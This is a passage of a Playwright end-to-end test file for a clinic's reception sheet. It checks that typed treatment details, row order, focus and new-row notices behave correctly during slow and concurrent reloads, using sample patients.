    // (the list is read at once and its answer arrives 900 ms later, so it does not have what is typed meanwhile)
    d.listVisits = async (...a) => { const list = await window.__listVisits.apply(d, a); await new Promise((r) => setTimeout(r, 900)); return list; };
    document.activeElement?.blur();
    document.dispatchEvent(new CustomEvent('sheet-reload')); // (as a live update or the 20-second check)
  });
  const details = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 020' }).locator('input[aria-label^="Treatment details for"]');
  await details.click();
  await pb.keyboard.press('End');
  await pb.keyboard.type(' brac35');
  await pb.waitForTimeout(1300); // the reload has come back meanwhile
  assert.equal(await details.inputValue(), 'U L 018 PC refresh brac35');
  await pb.keyboard.type(' ok');
  await pb.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  assert.equal(await details.inputValue(), 'U L 018 PC refresh brac35 ok');
  // leaving the list: the reload that waited is drawn (a few seconds after the last key), with what was saved
  await details.evaluate((el) => { el.closest('tr').dataset.before = 'yes'; });
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await pb.waitForFunction(() => { const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes('Sample Patient 020')); return tr && !tr.dataset.before; }, null, { timeout: 15000 });
  assert.equal(await details.inputValue(), 'U L 018 PC refresh brac35 ok');
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.listVisits = window.__listVisits; });
});
await step('busy day: with the cursor waiting in the Treatment cell of a patient just added by Mr#, rows the other computers change are drawn again where they are (nothing moves, typed text stays); the list is sorted once the cursor has left the table', async () => {
  const box = pb.locator('.add-panel input[type=search]');
  await box.fill('9820');
  await box.press('Enter');
  const inNewRow = () => pb.evaluate(() => !!document.activeElement?.matches('input[aria-label^="Treatment for"]') && document.activeElement.closest('tr').textContent.includes('Mr# 9820'));
  await pb.waitForFunction(() => document.activeElement?.matches('input[aria-label^="Treatment for"]') && document.activeElement.closest('tr')?.textContent.includes('Mr# 9820'));
  const statusOf = (name) => pb.evaluate((n) => [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes(n))?.querySelector('select[aria-label^="Status for"]').value, name);
  const shows = (name, status, timeout) => pb.waitForFunction(([n, s]) => [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes(n))?.querySelector('select[aria-label^="Status for"]').value === s, [name, status], { timeout });
  const order = await listOrder();
  await elsewhere({ 'Sample Patient 095': 'in_treatment' });
  await shows('Sample Patient 095', 'in_treatment', 4000);
  assert.ok(await inNewRow(), 'the cursor stays in the Treatment cell');
  assert.deepEqual(await listOrder(), order, 'drawn again where it was: no row moved');
  await pb.keyboard.press('Control+A');
  await pb.keyboard.type('Bonding');
  await elsewhere({ 'Sample Patient 094': 'in_treatment' });
  await shows('Sample Patient 094', 'in_treatment', 4000);
  assert.deepEqual(await listOrder(), order, 'still no row moved');
  assert.ok(await inNewRow(), 'the cursor is still in the Treatment cell');
  assert.equal(await pb.evaluate(() => document.activeElement?.value), 'Bonding', 'what was typed is still there');
  // Tab saves the cell and stays in the table: nothing moves yet; the cursor leaving the table lets the list be sorted
  await pb.keyboard.press('Tab');
  await pb.waitForTimeout(800);
  assert.deepEqual(await listOrder(), order, 'the cursor is in the table: no row moved');
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await pb.waitForFunction(() => {
    const names = [...document.querySelectorAll('table.sheet tbody tr[data-id]')].map((t) => [t.querySelector('.name-text')?.textContent, t.querySelector('select[aria-label^="Status for"]').value]);
    const at = (n) => names.findIndex(([x]) => x === n);
    return at('Sample Patient 094') > names.findLastIndex(([, s]) => s === 'waiting') && at('Sample Patient 095') > names.findLastIndex(([, s]) => s === 'waiting');
  }, null, { timeout: 15000 });
  assert.ok(await pb.evaluate(sortedLikeTheSheet), 'sorted like the sheet');
  assert.equal(await statusOf('Sample Patient 094'), 'in_treatment');
  assert.equal(await pb.locator('table.sheet tbody tr', { hasText: 'Mr# 9820' }).locator('input[aria-label^="Treatment for"]').inputValue(), 'Bonding');
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day: Treatment cells typed in and left with the text they had (nothing to save) do not hold up what the other computers change', async () => {
  const cellOf = (name) => pb.locator('table.sheet tbody tr', { hasText: name }).locator(`input[aria-label="Treatment for ${name}"]`);
  const was = {};
  // the same treatment typed over itself, and Enter (twice), then a letter typed and taken back
  for (const name of ['Sample Patient 088', 'Sample Patient 089']) {
    was[name] = await cellOf(name).inputValue();
    await cellOf(name).click();
    await pb.keyboard.press('Control+A');
    await pb.keyboard.type(was[name]);
    await pb.keyboard.press('Enter');
  }
  was['Sample Patient 087'] = await cellOf('Sample Patient 087').inputValue();
  await cellOf('Sample Patient 087').click();
  await pb.keyboard.press('End');
  await pb.keyboard.type('x');
  await pb.keyboard.press('Backspace');
  await pb.locator('h1').click(); // (the cursor leaves the list)
  // another reception computer changes a row, as a live update tells the list
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const v = (await state.data.listVisits({ branchId: 1, date: localISO() })).find((x) => x.patient.full_name === 'Sample Patient 097');
    await state.data.updateVisit(v.id, { status: 'in_treatment' });
    document.dispatchEvent(new CustomEvent('sheet-reload'));
  });
  await pb.waitForFunction(() => [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes('Sample Patient 097'))?.querySelector('select[aria-label^="Status for"]').value === 'in_treatment', null, { timeout: 12000 });
  for (const [name, value] of Object.entries(was)) assert.equal(await cellOf(name).inputValue(), value, `${name} keeps its treatment`);
});
await step('busy day: after a row\'s dialog adds the Dr. Ali flag, an invoice from the Pending chip, or a note and a payment, focus goes back to that patient\'s row, not to the page heading', async () => {
  const rowOf = (name) => pb.locator('table.sheet tbody tr', { hasText: name });
  const focused = () => pb.evaluate(() => { const el = document.activeElement; return [el?.closest('tr')?.querySelector('.name-text')?.textContent || el?.localName, el?.dataset.focus || '']; });
  const dialogs = pb.locator('.modal');
  // the flag (the row shows no flag: it is on the profile; the list is drawn again), from the keyboard: Enter on the name or the
  // month chip, the flag, Escape
  for (const [name, key] of [['Sample Patient 088', 'patient'], ['Sample Patient 089', 'month']]) {
    await rowOf(name).locator(`[data-focus="${key}"]`).focus();
    await pb.keyboard.press('Enter');
    await dialogs.getByRole('button', { name: 'Next appointment with Dr. Ali' }).click();
    await dialogs.getByLabel('Reason').fill('Sample: check the wire');
    await rowOf(name).evaluate((tr) => { tr.dataset.before = 'yes'; });
    await dialogs.getByRole('button', { name: 'Flag for Dr. Ali' }).click();
    await pb.waitForFunction((who) => { const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes(who)); return tr && !tr.dataset.before; }, name);
    await pb.waitForFunction(() => document.querySelectorAll('.modal').length === 1);
    await pb.keyboard.press('Escape');
    await pb.waitForSelector('.modal', { state: 'detached' });
    assert.deepEqual(await focused(), [name, key], `${name}: back on the control that opened the dialog`);
  }
  // a new invoice from the Pending chip, which turns Done (no button): back on the patient's name
  const r18 = rowOf('Sample Patient 018');
  await r18.locator('button.invoice-pending').focus();
  await pb.keyboard.press('Enter');
  await dialogs.getByLabel('Treatment, line 1').fill('Checkup');
  await dialogs.getByLabel('Price (Rs), line 1').fill('1500');
  await dialogs.getByRole('button', { name: 'Save invoice' }).click();
  await pb.waitForSelector('.modal', { state: 'detached' });
  await r18.locator('span.chip:text-is("Done")').waitFor();
  await pb.waitForFunction(() => document.activeElement?.matches('.name-btn') && document.activeElement.closest('tr').textContent.includes('Sample Patient 018'));
  // a note typed in the row's dialog, then a payment taken there, then Escape
  await rowOf('Sample Patient 014').locator('.name-btn').focus();
  await pb.keyboard.press('Enter');
  await dialogs.getByLabel('Notes').fill('Sample: pays on Friday');
  await dialogs.getByRole('button', { name: 'Take payment' }).click();
  await pb.locator('.modal:has(h2:has-text("Take payment · Sample Patient 014"))').getByRole('button', { name: 'Save payment' }).click();
  await pb.waitForFunction(() => /^0/.test([...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes('Sample Patient 014'))?.querySelector('td.pp').innerText));
  await pb.waitForFunction(() => document.querySelectorAll('.modal').length === 1);
  await pb.keyboard.press('Escape');
  await pb.waitForSelector('.modal', { state: 'detached' });
  assert.deepEqual(await focused(), ['Sample Patient 014', 'patient']);
  await expectNote(pb, 'Sample Patient 014', 'Sample: pays on Friday');
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day: a mouse that only rests on the rows does not hold the list: what other computers change is sorted in at once (a new patient at their place, not at the end), and the list does not scroll; a click in the table holds the order for 5 seconds', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => document.activeElement?.blur());
  await pb.waitForFunction(sortedLikeTheSheet, null, { timeout: 15000 });
  const waiting = await spareWaiting();
  assert.ok(waiting.length >= 9, 'waiting rows: ' + waiting.length);
  const nameRow = (n) => pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${n}")`) });
  const scrollTop = () => pb.evaluate(() => document.querySelector('.sheet-wrap').scrollTop);
  const below = (moved, still, timeout = 12000) => pb.waitForFunction(([a, b]) => {
    const names = [...document.querySelectorAll('table.sheet tbody tr[data-id] .name-text')].map((e) => e.textContent);
    return names.indexOf(a) > names.indexOf(b);
  }, [moved, still], { timeout });
  // the list scrolled down a little, and the mouse resting on the name of a waiting patient (no key, no click, for more
  // than 5 seconds)
  await pb.evaluate(() => { document.querySelector('.sheet-wrap').scrollTop = 100; });
  const box = await nameRow(waiting[6]).locator('.name-btn').boundingBox();
  await pb.mouse.move(box.x + box.width / 2, box.y + box.height / 2 - 10);
  await pb.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
  const top = await scrollTop();
  assert.ok(top > 50, 'scrolled: ' + top);
  await pb.waitForTimeout(5200);
  // another computer marks two waiting patients above it In treatment and puts Mr# 9833 on the list: sorted in at once
  await elsewhere({ [waiting[1]]: 'in_treatment', [waiting[2]]: 'in_treatment' }, '9833');
  await below(waiting[1], waiting[6], 2000);
  assert.ok(await pb.evaluate(sortedLikeTheSheet), 'sorted like the sheet');
  const added = await pb.evaluate(() => {
    const tr = [...document.querySelectorAll('table.sheet tbody tr[data-id]')].find((t) => t.textContent.includes('Mr# 9833'));
    return { last: !tr.nextElementSibling, status: tr.querySelector('select[aria-label^="Status for"]').value, next: tr.nextElementSibling?.querySelector('select[aria-label^="Status for"]')?.value };
  });
  assert.deepEqual(added, { last: false, status: 'waiting', next: 'waiting' }, 'the new patient is among the waiting ones, not at the end');
  assert.equal(await scrollTop(), top, 'the list did not scroll by itself');
  assert.equal(await pb.locator('.sheet-new-rows').innerText(), '', 'no note of new rows: they are on the list');
  // a click in the table, on a cell with nothing to click (a token): for the 5 seconds after it nothing moves, a row changed
  // elsewhere is drawn again where it is; then the list is sorted
  await nameRow(waiting[8]).locator('.token').click();
  const clicked = Date.now();
  const order = await listOrder();
  await elsewhere({ [waiting[3]]: 'in_treatment' });
  await pb.waitForFunction((n) => [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.querySelector('.name-text')?.textContent === n)?.querySelector('select[aria-label^="Status for"]').value === 'in_treatment', waiting[3], { timeout: 4000 });
  assert.deepEqual(await listOrder(), order, 'drawn again where it was: no row moved');
  await below(waiting[3], waiting[8]);
  assert.ok(Date.now() - clicked >= 4500, 'sorted only once the 5 seconds were over: ' + (Date.now() - clicked));
  assert.ok(await pb.evaluate(sortedLikeTheSheet), 'sorted like the sheet');
  await pb.mouse.move(5, 5);
});
await step('busy day, slow server: a patient added by Mr# while a reload in the background is on its way stays on the list, with the cursor in their Treatment cell, when that older answer comes back', async () => {
  await pb.mouse.move(5, 5); // (the keyboard only)
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__realListVisits ||= d.listVisits; // (kept once: a step that failed before putting it back leaves no stub to wrap)
    window.__asked = 0;
    // (the whole list is read at once and its answer arrives 1.5 s later; one patient's visits answer at once)
    d.listVisits = async (args) => {
      const list = await window.__realListVisits.call(d, args);
      if (!args.patientId) { window.__asked += 1; await new Promise((r) => setTimeout(r, 1500)); }
      return list;
    };
    document.activeElement?.blur();
    document.dispatchEvent(new CustomEvent('sheet-reload')); // (a live update, or the 20-second check)
  });
  await pb.waitForFunction(() => window.__asked > 0, null, { timeout: 10000 }); // (the reload is on its way)
  const box = pb.locator('.add-panel input[type=search]');
  await box.fill('9834');
  await box.press('Enter');
  const inRow = () => !!document.activeElement?.matches('input[aria-label^="Treatment for"]') && document.activeElement.closest('tr').textContent.includes('Mr# 9834');
  await pb.waitForFunction(inRow, null, { timeout: 5000 });
  await pb.waitForTimeout(2000); // the older answer, without Mr# 9834, has come back meanwhile
  assert.ok(await pb.evaluate(inRow), 'the row is still on the list, with the cursor in its Treatment cell');
  await pb.keyboard.press('Control+A');
  await pb.keyboard.type('Bracket fix');
  await pb.keyboard.press('Tab');
  const row = pb.locator('table.sheet tbody tr', { hasText: 'Mr# 9834' });
  assert.equal(await row.locator('input[aria-label^="Treatment for"]').inputValue(), 'Bracket fix');
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.listVisits = window.__realListVisits; document.activeElement?.blur(); });
  const saved = () => pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listVisits({ branchId: 1, date: localISO() })).filter((v) => v.patient.mr_number === '9834').map((v) => v.treatment_label);
  });
  for (let i = 0; i < 30 && JSON.stringify(await saved()) !== '["Bracket fix"]'; i++) await pb.waitForTimeout(200);
  assert.deepEqual(await saved(), ['Bracket fix'], 'one visit, with what was typed');
  assert.equal(await row.count(), 1);
});
await step('busy day, slow server: a cell typed and saved while a slow reload is on its way keeps what was typed when that older answer comes back, and the next key carries on from it', async () => {
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__realListVisits ||= d.listVisits;
    window.__asked = 0;
    window.__answered = 0;
    d.listVisits = async (args) => {
      const list = await window.__realListVisits.call(d, args);
      if (!args.patientId) { window.__asked += 1; await new Promise((r) => setTimeout(r, 7000)); window.__answered += 1; }
      return list;
    };
    document.activeElement?.blur();
    document.dispatchEvent(new CustomEvent('sheet-reload'));
  });
  await pb.waitForFunction(() => window.__asked > 0, null, { timeout: 10000 });
  const details = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 040' }).locator('input[aria-label^="Treatment details for"]');
  const was = await details.inputValue();
  await details.focus();
  await pb.keyboard.press('End');
  await pb.keyboard.type(' U L 016');
  await pb.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  // the answer asked for before the typing comes back more than 5 seconds after the last key
  await pb.waitForFunction(() => window.__answered > 0, null, { timeout: 12000 });
  await pb.waitForTimeout(300);
  assert.equal(await details.inputValue(), `${was} U L 016`, 'what was typed is still in the cell');
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.listVisits = window.__realListVisits; });
  await pb.keyboard.type('X');
  const saved = () => pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listVisits({ branchId: 1, date: localISO() })).find((v) => v.patient.full_name === 'Sample Patient 040').details_text;
  });
  for (let i = 0; i < 30 && (await saved()) !== `${was} U L 016X`; i++) await pb.waitForTimeout(200);
  assert.equal(await saved(), `${was} U L 016X`, 'saved with the key typed after it');
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day: the Mr# of a patient another computer has just put on the list (this screen has not been drawn again yet) goes to their row, with no second visit', async () => {
  // (this screen's reloads do not have Mr# 9835 yet: a live update held up while someone types in the list)
  const name = await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const d = state.data;
    window.__realListVisits ||= d.listVisits;
    d.listVisits = async (args) => { const list = await window.__realListVisits.call(d, args); return args.patientId ? list : list.filter((v) => v.patient.mr_number !== '9835'); };
    const p = (await d.searchPatients('9835')).find((x) => x.mr_number === '9835');
    await d.addVisit({ patient_id: p.id, branch_id: 1, visit_date: localISO(), treatment_label: 'Checkup', status: 'waiting' });
    return p.full_name;
  });
  assert.equal(await pb.locator('table.sheet tbody tr', { hasText: 'Mr# 9835' }).count(), 0, 'not on this screen yet');
  const box = pb.locator('.add-panel input[type=search]');
  await box.fill('9835');
  await box.press('Enter');
  await pb.waitForSelector(`.toast:has-text("${name} is already on the list")`);
  await pb.waitForFunction(() => document.activeElement?.matches('select[aria-label^="Status for"]') && document.activeElement.closest('tr').textContent.includes('Mr# 9835'));
  const visits = await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    state.data.listVisits = window.__realListVisits;
    return (await state.data.listVisits({ branchId: 1, date: localISO() })).filter((v) => v.patient.mr_number === '9835').length;
  });
  assert.equal(visits, 1, 'no second visit');
  assert.equal(await pb.locator('table.sheet tbody tr', { hasText: 'Mr# 9835' }).count(), 1);
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day at 1366x768: Treatment Details is about as wide as the sheet\'s column (a typical entry whole), and a longer one is whole in its tooltip, kept up to date while typing', async () => {
  await pb.mouse.move(5, 5);
  const details = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 041' }).locator('input[aria-label^="Treatment details for"]');
  const look = () => details.evaluate((el) => ({ width: Math.round(el.closest('td').getBoundingClientRect().width), cut: el.scrollWidth > el.clientWidth, title: el.title, value: el.value }));
  await details.focus();
  await pb.keyboard.press('Control+A');
  await pb.keyboard.type('UL 018 full arch PC refresh');
  let l = await look();
  assert.ok(l.width >= 250 && !l.cut && l.title === l.value, 'a typical entry is whole: ' + JSON.stringify(l));
  await pb.keyboard.type(', LL3 LL4 rebond, elastics given, next visit wire change');
  l = await look();
  assert.ok(l.cut && l.title === l.value, 'a longer one is cut in the cell, and whole in the tooltip: ' + JSON.stringify(l));
  await pb.keyboard.press('Tab');
  await pb.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  await pb.evaluate(() => document.activeElement?.blur());
});
// (the patient in the row under a point of the window, with the row's number)
const rowAt = (pg, [x, y]) => pg.evaluate(([px, py]) => {
  const tr = document.elementFromPoint(px, py)?.closest('tr');
  return tr ? `${tr.querySelector('td.rownum')?.textContent ?? ''} ${tr.querySelector('.name-text')?.textContent || tr.querySelector('[data-field=patient_name]')?.value || tr.textContent}` : null;
}, [x, y]);
await step('busy day, slow server: a status, group or doctor change whose answer was read before a typed save of the same row (and comes back after it) keeps what was typed, in the cell and in the data, and the next key carries on from it', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => document.activeElement?.blur());
  // The change is made at once, and its answer, read then, comes back 2.5 s later (on the live site the answer is a write
  // and four reads); the typed cells save at once.
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__lateReal ||= { updateVisit: d.updateVisit, setVisitStaff: d.setVisitStaff };
    const late = (answer) => new Promise((res) => setTimeout(() => res(answer), 2500));
    d.updateVisit = async (id, changes) => {
      const answer = await window.__lateReal.updateVisit.call(d, id, changes);
      return 'status' in changes || 'doctor_group_id' in changes ? late(answer) : answer;
    };
    d.setVisitStaff = async (...a) => late(await window.__lateReal.setVisitStaff.apply(d, a));
  });
  const rowOf = (name) => pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${name}")`) });
  const cellOf = (name, field) => pb.evaluate(([who, f]) => {
    const tr = [...document.querySelectorAll('table.sheet tbody tr[data-id]')].find((t) => t.querySelector('.name-text')?.textContent === who);
    const el = tr.querySelector(`[data-field="${f}"]`);
    return { value: el.value, cursorIn: el === document.activeElement };
  }, [name, field]);
  const savedOf = (name, field) => pb.evaluate(async ([who, f]) => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listVisits({ branchId: 1, date: localISO() })).find((v) => v.patient.full_name === who)[f];
  }, [name, field]);
  const untilSaved = async (name, field, want) => {
    for (let i = 0; i < 30 && (await savedOf(name, field)) !== want; i++) await pb.waitForTimeout(200);
    assert.equal(await savedOf(name, field), want, `${name}: ${field} saved`);
  };
  // Treatment Details (it saves as it is typed), typed straight after the change, and the answer comes after its save
  const typeAfter = async (name, change, text) => {
    const details = rowOf(name).locator('input[aria-label^="Treatment details for"]');
    const was = await details.inputValue();
    await change();
    await details.click();
    await pb.keyboard.press('End');
    await pb.keyboard.type(text, { delay: 30 });
    await pb.waitForTimeout(2900); // (the typed save has gone, then the answer comes and the row is drawn again)
    assert.deepEqual(await cellOf(name, 'details_text'), { value: was + text, cursorIn: true }, `${name}: what was typed is still in the cell`);
    await pb.keyboard.type('!');
    await untilSaved(name, 'details_text', `${was}${text}!`);
    await pb.evaluate(() => document.activeElement?.blur());
  };
  await typeAfter('Sample Patient 083', () => rowOf('Sample Patient 083').locator('select[aria-label^="Status for"]').selectOption('in_treatment'), ' U L 016 PC');
  const group = rowOf('Sample Patient 085').locator('select[aria-label^="Doctor group for"]');
  const other = (await group.inputValue()) === '2' ? '1' : '2';
  await typeAfter('Sample Patient 085', () => group.selectOption(other), ' brac 31');
  await typeAfter('Sample Patient 108', async () => {
    await rowOf('Sample Patient 108').locator('.person').first().hover();
    await rowOf('Sample Patient 108').locator('.person .chip-remove').first().click();
  }, ' + ext UR4');
  // Treatment (it saves when the cell is left), typed and left before the answer to a group picked just before
  const g86 = rowOf('Sample Patient 086').locator('select[aria-label^="Doctor group for"]');
  await g86.selectOption((await g86.inputValue()) === '2' ? '1' : '2');
  await rowOf('Sample Patient 086').locator('input[aria-label^="Treatment for"]').click();
  await pb.keyboard.press('Control+A');
  await pb.keyboard.type('Bracket Fix');
  await pb.keyboard.press('Tab');
  await pb.waitForTimeout(2900);
  assert.equal((await cellOf('Sample Patient 086', 'treatment_label')).value, 'Bracket Fix', 'the Treatment cell keeps what was typed');
  await untilSaved('Sample Patient 086', 'treatment_label', 'Bracket Fix');
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    Object.assign(state.data, window.__lateReal);
    document.activeElement?.blur();
  });
});
await step('busy day: a patient another computer adds while someone types in the table waits (a short note says so) and comes in at their place in the order once they are done, not at the end; the list does not scroll by itself', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => { document.activeElement?.blur(); document.querySelector('.sheet-wrap').scrollTop = 0; });
  await pb.waitForFunction(sortedLikeTheSheet, null, { timeout: 15000 });
  const scrollTop = () => pb.evaluate(() => document.querySelector('.sheet-wrap').scrollTop);
  await pb.evaluate(() => { document.querySelector('.sheet-wrap').scrollTop = 60; });
  const waiting = await spareWaiting();
  const details = pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${waiting[4]}")`) }).locator('input[aria-label^="Treatment details for"]');
  const was = await details.inputValue();
  await details.click();
  await pb.keyboard.press('End');
  await pb.keyboard.type(' U L 016');
  const top = await scrollTop();
  assert.ok(top > 0, 'the list is scrolled a little: ' + top);
  const order = await listOrder();
  const id = await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const on = new Set((await state.data.listVisits({ branchId: 1, date: localISO() })).map((v) => v.patient_id));
    const p = (await state.data.searchPatients('98')).find((x) => /^98\d\d$/.test(x.mr_number) && !on.has(x.id));
    const v = await state.data.addVisit({ patient_id: p.id, branch_id: 1, visit_date: localISO(), treatment_label: 'Checkup', status: 'waiting' });
    document.dispatchEvent(new CustomEvent('sheet-reload'));
    return v.id;
  });
  const note = pb.locator('.sheet-new-rows');
  await pb.waitForFunction(() => document.querySelector('.sheet-new-rows').textContent === '1 new row, it appears when you leave the list');
  assert.equal(await note.getAttribute('role'), 'status', 'said quietly to a screen reader too');
  const row = pb.locator(`table.sheet tbody tr[data-id="${id}"]`);
  assert.equal(await row.count(), 0, 'not on the list yet');
  assert.deepEqual(await listOrder(), order, 'no row moved');
  assert.equal(await details.inputValue(), `${was} U L 016`, 'what is typed stays');
  // the person is done: the cursor leaves the table, and a few seconds after the last key the patient comes in among the
  // waiting ones, with the list where it was
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await row.waitFor({ timeout: 15000 });
  const where = await row.evaluate((tr) => ({ last: !tr.nextElementSibling, status: tr.querySelector('select[aria-label^="Status for"]').value,
    next: tr.nextElementSibling?.dataset.kind === 'checkup' ? 'checkup' : tr.nextElementSibling?.querySelector('select[aria-label^="Status for"]').value }));
  assert.ok(!where.last && where.status === 'waiting' && ['waiting', 'checkup'].includes(where.next), 'at their place among the waiting patients: ' + JSON.stringify(where));
  assert.ok(await pb.evaluate(sortedLikeTheSheet), 'sorted like the sheet');
  assert.equal(await note.innerText(), '', 'the note has gone');
  assert.equal(await scrollTop(), top, 'the list did not scroll by itself');
  assert.equal(await details.inputValue(), `${was} U L 016`);
  await pb.evaluate(() => { document.activeElement?.blur(); document.querySelector('.sheet-wrap').scrollTop = 0; });
});
// (another computer puts a demo patient who is not on today's list yet on it, and the list is told; returns the visit's id)
const addElsewhere = () => pb.evaluate(async () => {
  const { state } = await import('/js/state.js');
  const { localISO } = await import('/js/ui/dom.js');
  const d = state.data;
  const on = new Set((await d.listVisits({ branchId: 1, date: localISO() })).map((v) => v.patient_id));
  const p = (await d.searchPatients('98')).find((x) => /^98\d\d$/.test(x.mr_number) && !on.has(x.id));
  const v = await d.addVisit({ patient_id: p.id, branch_id: 1, visit_date: localISO(), treatment_label: 'Checkup', status: 'waiting' });
  document.dispatchEvent(new CustomEvent('sheet-reload'));
  return v.id;
});
// (an Mr# of the demo patients that is not on today's list yet)
const freeMr = () => pb.evaluate(async () => {
  const { state } = await import('/js/state.js');
  const { localISO } = await import('/js/ui/dom.js');
  const on = new Set((await state.data.listVisits({ branchId: 1, date: localISO() })).map((v) => v.patient_id));
  return (await state.data.searchPatients('98')).find((x) => /^98\d\d$/.test(x.mr_number) && !on.has(x.id)).mr_number;
});
await step('busy day: while the cursor rests in a cell, the note counts every new row that waits, through the reloads that come meanwhile ("2 new rows"), and they come in once the cursor leaves the list', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => { document.activeElement?.blur(); document.querySelector('.sheet-wrap').scrollTop = 0; });
  await pb.waitForFunction(sortedLikeTheSheet, null, { timeout: 15000 });
  const waiting = await spareWaiting();
  const row = (n) => pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${n}")`) });
  const treatment = row(waiting[5]).locator('input[aria-label^="Treatment for"]');
  await treatment.click(); // (and nothing typed: the cursor only rests there)
  await pb.waitForTimeout(5300);
  const note = () => pb.locator('.sheet-new-rows').innerText();
  const shown = () => pb.locator('table.sheet tbody tr[data-id]').count();
  const n0 = await shown();
  const first = await addElsewhere();
  await pb.waitForFunction(() => document.querySelector('.sheet-new-rows').textContent === '1 new row, it appears when you leave the list');
  // a reload with no new row (another row changed elsewhere, drawn again where it is): the note stays, the row still waits
  await elsewhere({ [waiting[7]]: 'in_treatment' });
  await pb.waitForFunction((n) => [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.querySelector('.name-text')?.textContent === n)?.querySelector('select[aria-label^="Status for"]').value === 'in_treatment', waiting[7], { timeout: 4000 });
  assert.equal(await note(), '1 new row, it appears when you leave the list', 'the note stays while the row waits');
  assert.equal(await shown(), n0, 'not on the list yet');
  // a second patient: two rows wait
  const second = await addElsewhere();
  await pb.waitForFunction(() => document.querySelector('.sheet-new-rows').textContent === '2 new rows, they appear when you leave the list', null, { timeout: 4000 });
  assert.equal(await shown(), n0);
  assert.ok(await treatment.evaluate((el) => el === document.activeElement), 'the cursor is still in the cell');
  // the cursor leaves the list: both come in, and the note goes
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await pb.locator(`table.sheet tbody tr[data-id="${second}"]`).waitFor({ timeout: 15000 });
  assert.equal(await pb.locator(`table.sheet tbody tr[data-id="${first}"]`).count(), 1);
  assert.equal(await shown(), n0 + 2);
  assert.equal(await note(), '', 'the note has gone');
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day: a row another computer changes while the cursor is in it is drawn again where it is at the first reload after the cursor has moved to another row (nothing moves)', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => document.activeElement?.blur());
  await pb.waitForFunction(sortedLikeTheSheet, null, { timeout: 15000 });
  const name = (await spareWaiting())[2];
  const row = pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${name}")`) });
  await row.locator('input[aria-label^="Treatment for"]').click();
  const order = await listOrder();
  await pb.evaluate(async (who) => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const v = (await state.data.listVisits({ branchId: 1, date: localISO() })).find((x) => x.patient.full_name === who);
    await state.data.updateVisit(v.id, { status: 'in_treatment', details_text: 'Sample: written by the doctor' });
    document.dispatchEvent(new CustomEvent('sheet-reload'));
  }, name);
  await pb.waitForTimeout(800);
  assert.equal(await row.locator('select[aria-label^="Status for"]').inputValue(), 'waiting', 'not drawn again while the cursor is in it');
  // the cursor goes down to the next row; the next reload (a live update, the 20-second check) draws the row again in place
  await pb.keyboard.press('ArrowDown');
  assert.ok(!(await row.evaluate((tr) => tr.contains(document.activeElement))), 'the cursor is in another row');
  await pb.evaluate(() => document.dispatchEvent(new CustomEvent('sheet-reload')));
  await pb.waitForFunction((who) => [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.querySelector('.name-text')?.textContent === who)?.querySelector('select[aria-label^="Status for"]').value === 'in_treatment', name, { timeout: 4000 });
  assert.equal(await row.locator('input[aria-label^="Treatment details for"]').inputValue(), 'Sample: written by the doctor', 'with what the doctor wrote');
  assert.deepEqual(await listOrder(), order, 'drawn again where it was: no row moved');
  await pb.evaluate(() => document.activeElement?.blur());
});
